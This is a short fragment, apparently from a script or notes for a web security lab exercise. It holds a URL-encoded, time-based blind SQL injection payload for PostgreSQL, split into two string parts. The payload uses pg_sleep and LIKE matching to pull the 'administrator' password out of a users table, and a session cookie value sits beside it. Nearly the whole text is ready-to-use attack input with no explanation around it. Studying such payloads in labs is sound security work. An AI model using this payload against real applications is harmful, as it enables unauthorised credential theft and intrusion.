...
Part1="'||+(SELECT+CASE+WHEN+(password+like('"
Part2="%25'))+THEN+pg_sleep(10)ELSE+pg_SLEEP(0)+END+from+users+where+username='administrator')--+- session=P7HQ11CdfoRyMhQ9Hq15rMBKHKRaVKnw"
##
